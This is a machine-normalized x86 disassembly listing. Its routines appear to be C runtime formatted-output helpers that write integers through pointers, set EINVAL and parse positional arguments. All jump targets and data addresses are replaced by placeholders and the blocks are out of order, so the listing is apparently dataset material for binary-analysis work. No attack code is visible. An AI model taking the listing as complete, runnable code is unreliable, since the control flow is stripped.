jmp r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41be72
push edx
push ecx
mov ecx esi
call sub_41c4bf
jmp r-xdata
mov al 0x1
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_4260c8
mov edi edi
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
call sub_435998
test eax eax
jne r-xdata
push [ esi + 0x2c ]
call sub_4230ce
pop ecx
sub eax 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
mov al [ esi + 0x18 ]
mov [ edi ] al
sub eax 0x1
je r-xdata
pop edi
pop esi
retn
mov ax [ esi + 0x18 ]
mov [ edi ] ax
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov al 0x1
mov eax [ esi + 0x18 ]
mov [ edi ] eax
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
cdq
mov [ edi ] eax
mov [ edi + 0x4 ] edx
jmp r-xdata
sub_42613c
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
mov esi ecx
call sub_41a66d
test al al
jne r-xdata
mov ecx esi
call sub_41f37a
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
call sub_435998
test eax eax
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0x2c ]
call sub_4230ce
pop ecx
sub eax 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov cl [ esi + 0x18 ]
mov [ eax ] cl
sub eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov cx [ esi + 0x18 ]
mov [ eax ] cx
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x18 ]
mov [ eax ] ecx
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ ebp - 0x4 ]
cdq
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_4261d5
mov edi edi
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
call sub_435998
test eax eax
jne r-xdata
push [ esi + 0x2c ]
call sub_4230ce
pop ecx
sub eax 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
mov al [ esi + 0x18 ]
mov [ edi ] al
sub eax 0x1
je r-xdata
pop edi
pop esi
retn
mov ax [ esi + 0x18 ]
mov [ edi ] ax
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov al 0x1
mov eax [ esi + 0x18 ]
mov [ edi ] eax
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
cdq
mov [ edi ] eax
mov [ edi + 0x4 ] edx
jmp r-xdata
sub_426249
mov edi edi
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
call sub_435998
test eax eax
jne r-xdata
push [ esi + 0x2c ]
call sub_4230ce
pop ecx
sub eax 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
mov al [ esi + 0x18 ]
mov [ edi ] al
sub eax 0x1
je r-xdata
pop edi
pop esi
retn
mov ax [ esi + 0x18 ]
mov [ edi ] ax
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov al 0x1
mov eax [ esi + 0x18 ]
mov [ edi ] eax
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
cdq
mov [ edi ] eax
mov [ edi + 0x4 ] edx
jmp r-xdata
sub_4262bd
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
mov esi ecx
call sub_41a6eb
test al al
jne r-xdata
mov ecx esi
call sub_41f390
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
call sub_435998
test eax eax
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0x2c ]
call sub_4230ce
pop ecx
sub eax 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov cl [ esi + 0x18 ]
mov [ eax ] cl
sub eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov cx [ esi + 0x18 ]
mov [ eax ] cx
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x18 ]
mov [ eax ] ecx
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ ebp - 0x4 ]
cdq
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_426356
mov edi edi
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
call sub_435998
test eax eax
jne r-xdata
push [ esi + 0x2c ]
call sub_4230ce
pop ecx
sub eax 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
mov al [ esi + 0x18 ]
mov [ edi ] al
sub eax 0x1
je r-xdata
pop edi
pop esi
retn
mov ax [ esi + 0x18 ]
mov [ edi ] ax
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov al 0x1
mov eax [ esi + 0x18 ]
mov [ edi ] eax
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
cdq
mov [ edi ] eax
mov [ edi + 0x4 ] edx
jmp r-xdata
sub_4263ca
mov edi edi
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
call sub_435998
test eax eax
jne r-xdata
push [ esi + 0x2c ]
call sub_4230ce
pop ecx
sub eax 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
mov al [ esi + 0x18 ]
mov [ edi ] al
sub eax 0x1
je r-xdata
pop edi
pop esi
retn
mov ax [ esi + 0x18 ]
mov [ edi ] ax
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov al 0x1
mov eax [ esi + 0x18 ]
mov [ edi ] eax
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
cdq
mov [ edi ] eax
mov [ edi + 0x4 ] edx
jmp r-xdata
sub_42643e
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
mov esi ecx
call sub_41a769
test al al
jne r-xdata
mov ecx esi
call sub_41f3a6
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
call sub_435998
test eax eax
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0x2c ]
call sub_4230ce
pop ecx
sub eax 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov cl [ esi + 0x18 ]
mov [ eax ] cl
sub eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov cx [ esi + 0x18 ]
mov [ eax ] cx
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x18 ]
mov [ eax ] ecx
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ ebp - 0x4 ]
cdq
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_4264d7
mov edi edi
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
call sub_435998
test eax eax
jne r-xdata
push [ esi + 0x2c ]
call sub_4230ce
pop ecx
sub eax 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
mov al [ esi + 0x18 ]
mov [ edi ] al
sub eax 0x1
je r-xdata
pop edi
pop esi
retn
mov ax [ esi + 0x18 ]
mov [ edi ] ax
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov al 0x1
mov eax [ esi + 0x18 ]
mov [ edi ] eax
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
cdq
mov [ edi ] eax
mov [ edi + 0x4 ] edx
jmp r-xdata
sub_42654b
mov edi edi
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
call sub_435998
test eax eax
jne r-xdata
push [ esi + 0x2c ]
call sub_4230ce
pop ecx
sub eax 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
mov al [ esi + 0x18 ]
mov [ edi ] al
sub eax 0x1
je r-xdata
pop edi
pop esi
retn
mov ax [ esi + 0x18 ]
mov [ edi ] ax
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov al 0x1
mov eax [ esi + 0x18 ]
mov [ edi ] eax
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
cdq
mov [ edi ] eax
mov [ edi + 0x4 ] edx
jmp r-xdata
sub_4265bf
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
mov esi ecx
call sub_41a7e7
test al al
jne r-xdata
mov ecx esi
call sub_41f3bc
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
call sub_435998
test eax eax
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0x2c ]
call sub_4230ce
pop ecx
sub eax 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov cl [ esi + 0x18 ]
mov [ eax ] cl
sub eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov cx [ esi + 0x18 ]
mov [ eax ] cx
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x18 ]
mov [ eax ] ecx
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ ebp - 0x4 ]
cdq
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_426658
mov edi edi
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
call sub_435998
test eax eax
jne r-xdata
push [ esi + 0x2c ]
call sub_4230ce
pop ecx
sub eax 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
mov al [ esi + 0x18 ]
mov [ edi ] al
sub eax 0x1
je r-xdata
pop edi
pop esi
retn
mov ax [ esi + 0x18 ]
mov [ edi ] ax
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov al 0x1
mov eax [ esi + 0x18 ]
mov [ edi ] eax
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
cdq
mov [ edi ] eax
mov [ edi + 0x4 ] edx
jmp r-xdata
sub_426960
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ esi + 0x28 ]
mov ebx [ eax - 0x4 ]
mov [ esi + 0x34 ] ebx
cmp edi 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b585
add esp 0x10
test al al
je r-xdata
mov edi 0x7fffffff
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
push edi
push [ esi + 0x34 ]
call sub_4348ca
mov [ esi + 0x34 ] r--data
push edi
push [ esi + 0x34 ]
mov [ esi + 0x3c ] 0x1
call sub_4349f1
jmp r-xdata
mov [ esi + 0x34 ] r--data
pop ecx
pop ecx
pop edi
mov [ esi + 0x38 ] eax
mov al 0x1
pop esi
pop ebx
retn
sub_4269d3
mov edi edi
push esi
mov esi ecx
push edi
lea edi [ esi + 0x34 ]
push edi
call sub_41a0dd
test al al
je r-xdata
pop edi
pop esi
retn
mov ecx esi
call sub_41f37a
test al al
je r-xdata
mov al 0x1
push ebx
mov ebx [ esi + 0x28 ]
cmp ebx 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b585
add esp 0x10
test al al
je r-xdata
mov ebx 0x7fffffff
cmp [ edi ] 0x0
jne r-xdata
cmp [ edi ] 0x0
jne r-xdata
push ebx
push [ edi ]
call sub_4348ca
mov [ edi ] r--data
push ebx
push [ edi ]
mov [ esi + 0x3c ] 0x1
call sub_4349f1
jmp r-xdata
mov [ edi ] r--data
pop ecx
pop ecx
mov [ esi + 0x38 ] eax
pop ebx
sub_426a4f
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ esi + 0x28 ]
mov ebx [ eax - 0x4 ]
mov [ esi + 0x34 ] ebx
cmp edi 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b585
add esp 0x10
test al al
je r-xdata
mov edi 0x7fffffff
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
push edi
push [ esi + 0x34 ]
call sub_4348ca
mov [ esi + 0x34 ] r--data
push edi
push [ esi + 0x34 ]
mov [ esi + 0x3c ] 0x1
call sub_4349f1
jmp r-xdata
mov [ esi + 0x34 ] r--data
pop ecx
pop ecx
pop edi
mov [ esi + 0x38 ] eax
mov al 0x1
pop esi
pop ebx
retn
sub_426ac2
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ esi + 0x28 ]
mov ebx [ eax - 0x4 ]
mov [ esi + 0x34 ] ebx
cmp edi 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b585
add esp 0x10
test al al
je r-xdata
mov edi 0x7fffffff
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
push edi
push [ esi + 0x34 ]
call sub_4348ca
mov [ esi + 0x34 ] r--data
push edi
push [ esi + 0x34 ]
mov [ esi + 0x3c ] 0x1
call sub_4349f1
jmp r-xdata
mov [ esi + 0x34 ] r--data
pop ecx
pop ecx
pop edi
mov [ esi + 0x38 ] eax
mov al 0x1
pop esi
pop ebx
retn
sub_426b35
mov edi edi
push esi
mov esi ecx
push edi
lea edi [ esi + 0x34 ]
push edi
call sub_41a15b
test al al
je r-xdata
pop edi
pop esi
retn
mov ecx esi
call sub_41f390
test al al
je r-xdata
mov al 0x1
push ebx
mov ebx [ esi + 0x28 ]
cmp ebx 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b585
add esp 0x10
test al al
je r-xdata
mov ebx 0x7fffffff
cmp [ edi ] 0x0
jne r-xdata
cmp [ edi ] 0x0
jne r-xdata
push ebx
push [ edi ]
call sub_4348ca
mov [ edi ] r--data
push ebx
push [ edi ]
mov [ esi + 0x3c ] 0x1
call sub_4349f1
jmp r-xdata
mov [ edi ] r--data
pop ecx
pop ecx
mov [ esi + 0x38 ] eax
pop ebx
sub_426bb1
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ esi + 0x28 ]
mov ebx [ eax - 0x4 ]
mov [ esi + 0x34 ] ebx
cmp edi 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b585
add esp 0x10
test al al
je r-xdata
mov edi 0x7fffffff
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
push edi
push [ esi + 0x34 ]
call sub_4348ca
mov [ esi + 0x34 ] r--data
push edi
push [ esi + 0x34 ]
mov [ esi + 0x3c ] 0x1
call sub_4349f1
jmp r-xdata
mov [ esi + 0x34 ] r--data
pop ecx
pop ecx
pop edi
mov [ esi + 0x38 ] eax
mov al 0x1
pop esi
pop ebx
retn
sub_426c24
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ esi + 0x28 ]
mov ebx [ eax - 0x4 ]
mov [ esi + 0x34 ] ebx
cmp edi 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b5c5
add esp 0x10
test al al
je r-xdata
mov edi 0x7fffffff
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
push 0x0
push edi
mov ecx esi
call sub_426f74
mov [ esi + 0x34 ] r--data
push edi
push [ esi + 0x34 ]
mov [ esi + 0x3c ] 0x1
call sub_4349f1
pop ecx
pop ecx
jmp r-xdata
mov [ esi + 0x34 ] r--data
pop edi
mov [ esi + 0x38 ] eax
mov al 0x1
pop esi
pop ebx
retn
sub_426c98
mov edi edi
push esi
mov esi ecx
push edi
lea edi [ esi + 0x34 ]
push edi
call sub_41a1d9
test al al
je r-xdata
pop edi
pop esi
retn
mov ecx esi
call sub_41f3a6
test al al
je r-xdata
mov al 0x1
push ebx
mov ebx [ esi + 0x28 ]
cmp ebx 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b5c5
add esp 0x10
test al al
je r-xdata
mov ebx 0x7fffffff
cmp [ edi ] 0x0
jne r-xdata
cmp [ edi ] 0x0
jne r-xdata
push 0x0
push ebx
mov ecx esi
call sub_426fb4
mov [ edi ] r--data
push ebx
push [ edi ]
mov [ esi + 0x3c ] 0x1
call sub_4349f1
pop ecx
pop ecx
jmp r-xdata
mov [ edi ] r--data
mov [ esi + 0x38 ] eax
pop ebx
sub_426d16
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ esi + 0x28 ]
mov ebx [ eax - 0x4 ]
mov [ esi + 0x34 ] ebx
cmp edi 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b5c5
add esp 0x10
test al al
je r-xdata
mov edi 0x7fffffff
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
push 0x0
push edi
mov ecx esi
call sub_426ff4
mov [ esi + 0x34 ] r--data
push edi
push [ esi + 0x34 ]
mov [ esi + 0x3c ] 0x1
call sub_4349f1
pop ecx
pop ecx
jmp r-xdata
mov [ esi + 0x34 ] r--data
pop edi
mov [ esi + 0x38 ] eax
mov al 0x1
pop esi
pop ebx
retn
sub_426d8a
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ esi + 0x28 ]
mov ebx [ eax - 0x4 ]
mov [ esi + 0x34 ] ebx
cmp edi 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b5c5
add esp 0x10
test al al
je r-xdata
mov edi 0x7fffffff
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
push 0x0
push edi
mov ecx esi
call sub_427034
mov [ esi + 0x34 ] r--data
push edi
push [ esi + 0x34 ]
mov [ esi + 0x3c ] 0x1
call sub_4349f1
pop ecx
pop ecx
jmp r-xdata
mov [ esi + 0x34 ] r--data
pop edi
mov [ esi + 0x38 ] eax
mov al 0x1
pop esi
pop ebx
retn
sub_426dfe
mov edi edi
push esi
mov esi ecx
push edi
lea edi [ esi + 0x34 ]
push edi
call sub_41a257
test al al
je r-xdata
pop edi
pop esi
retn
mov ecx esi
call sub_41f3bc
test al al
je r-xdata
mov al 0x1
push ebx
mov ebx [ esi + 0x28 ]
cmp ebx 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b5c5
add esp 0x10
test al al
je r-xdata
mov ebx 0x7fffffff
cmp [ edi ] 0x0
jne r-xdata
cmp [ edi ] 0x0
jne r-xdata
push 0x0
push ebx
mov ecx esi
call sub_427074
mov [ edi ] r--data
push ebx
push [ edi ]
mov [ esi + 0x3c ] 0x1
call sub_4349f1
pop ecx
pop ecx
jmp r-xdata
mov [ edi ] r--data
mov [ esi + 0x38 ] eax
pop ebx
sub_426e7c
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ esi + 0x28 ]
mov ebx [ eax - 0x4 ]
mov [ esi + 0x34 ] ebx
cmp edi 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b5c5
add esp 0x10
test al al
je r-xdata
mov edi 0x7fffffff
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
push 0x0
push edi
mov ecx esi
call sub_4270b4
mov [ esi + 0x34 ] r--data
push edi
push [ esi + 0x34 ]
mov [ esi + 0x3c ] 0x1
call sub_4349f1
pop ecx
pop ecx
jmp r-xdata
mov [ esi + 0x34 ] r--data
pop edi
mov [ esi + 0x38 ] eax
mov al 0x1
pop esi
pop ebx
retn
sub_426f74
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
xor esi esi
mov edx [ edi + 0x34 ]
cmp [ ebp + 0x8 ] esi
jle r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
pop ebx
movzx ecx al
mov ebx 0x8000
mov eax [ edi + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
test [ eax + ecx * 2 ] bx
je r-xdata
inc edx
inc esi
cmp esi [ ebp + 0x8 ]
jl r-xdata
inc edx
mov al [ edx ]
test al al
je r-xdata
sub_426fb4
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
xor esi esi
mov edx [ edi + 0x34 ]
cmp [ ebp + 0x8 ] esi
jle r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
pop ebx
movzx ecx al
mov ebx 0x8000
mov eax [ edi + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
test [ eax + ecx * 2 ] bx
je r-xdata
inc edx
inc esi
cmp esi [ ebp + 0x8 ]
jl r-xdata
inc edx
mov al [ edx ]
test al al
je r-xdata
sub_426ff4
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
xor esi esi
mov edx [ edi + 0x34 ]
cmp [ ebp + 0x8 ] esi
jle r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
pop ebx
movzx ecx al
mov ebx 0x8000
mov eax [ edi + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
test [ eax + ecx * 2 ] bx
je r-xdata
inc edx
inc esi
cmp esi [ ebp + 0x8 ]
jl r-xdata
inc edx
mov al [ edx ]
test al al
je r-xdata
sub_427034
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
xor esi esi
mov edx [ edi + 0x34 ]
cmp [ ebp + 0x8 ] esi
jle r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
pop ebx
movzx ecx al
mov ebx 0x8000
mov eax [ edi + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
test [ eax + ecx * 2 ] bx
je r-xdata
inc edx
inc esi
cmp esi [ ebp + 0x8 ]
jl r-xdata
inc edx
mov al [ edx ]
test al al
je r-xdata
sub_427074
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
xor esi esi
mov edx [ edi + 0x34 ]
cmp [ ebp + 0x8 ] esi
jle r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
pop ebx
movzx ecx al
mov ebx 0x8000
mov eax [ edi + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
test [ eax + ecx * 2 ] bx
je r-xdata
inc edx
inc esi
cmp esi [ ebp + 0x8 ]
jl r-xdata
inc edx
mov al [ edx ]
test al al
je r-xdata
sub_4270b4
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
xor esi esi
mov edx [ edi + 0x34 ]
cmp [ ebp + 0x8 ] esi
jle r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
pop ebx
movzx ecx al
mov ebx 0x8000
mov eax [ edi + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
test [ eax + ecx * 2 ] bx
je r-xdata
inc edx
inc esi
cmp esi [ ebp + 0x8 ]
jl r-xdata
inc edx
mov al [ edx ]
test al al
je r-xdata
sub_4272b0
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x45c ] 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push 0xa
push eax
push [ esi + 0x10 ]
call sub_433e4c
add esp 0xc
cmp [ esi + 0x458 ] 0x1
lea edx [ eax - 0x1 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x1 ]
mov [ esi + 0x10 ] ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov edx [ esi + 0x14 ]
mov ecx [ edx - 0x4 ]
mov [ esi + 0x24 ] ecx
jmp r-xdata
add edx edx
mov eax [ esi + edx * 8 + 0x46c ]
mov eax [ eax ]
mov [ esi + 0x24 ] eax
test edx edx
js r-xdata
mov al 0x1
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
cmp [ eax ] 0x24
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp edx 0x64
jge r-xdata
mov eax [ esi + 0xaa4 ]
cmp edx eax
jle r-xdata
push [ esi + 0x2c ]
mov [ esi + 0xaa4 ] eax
mov ecx esi
movzx eax [ esi + 0x31 ]
push eax
shl edx 0x4
lea eax [ esi + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427956
jmp r-xdata
mov eax edx
sub_427366
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x45c ] 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push 0xa
push eax
push [ esi + 0x10 ]
call sub_433e4c
add esp 0xc
cmp [ esi + 0x458 ] 0x1
lea edx [ eax - 0x1 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x1 ]
mov [ esi + 0x10 ] ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov edx [ esi + 0x14 ]
mov ecx [ edx - 0x4 ]
mov [ esi + 0x24 ] ecx
jmp r-xdata
add edx edx
mov eax [ esi + edx * 8 + 0x46c ]
mov eax [ eax ]
mov [ esi + 0x24 ] eax
test edx edx
js r-xdata
mov al 0x1
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
cmp [ eax ] 0x24
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp edx 0x64
jge r-xdata
mov eax [ esi + 0xaa4 ]
cmp edx eax
jle r-xdata
push [ esi + 0x2c ]
mov [ esi + 0xaa4 ] eax
mov ecx esi
movzx eax [ esi + 0x31 ]
push eax
shl edx 0x4
lea eax [ esi + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4279a1
jmp r-xdata
mov eax edx
sub_42741c
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x45c ] 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push 0xa
push eax
push [ esi + 0x10 ]
call sub_433f54
add esp 0xc
cmp [ esi + 0x458 ] 0x1
lea edx [ eax - 0x1 ]
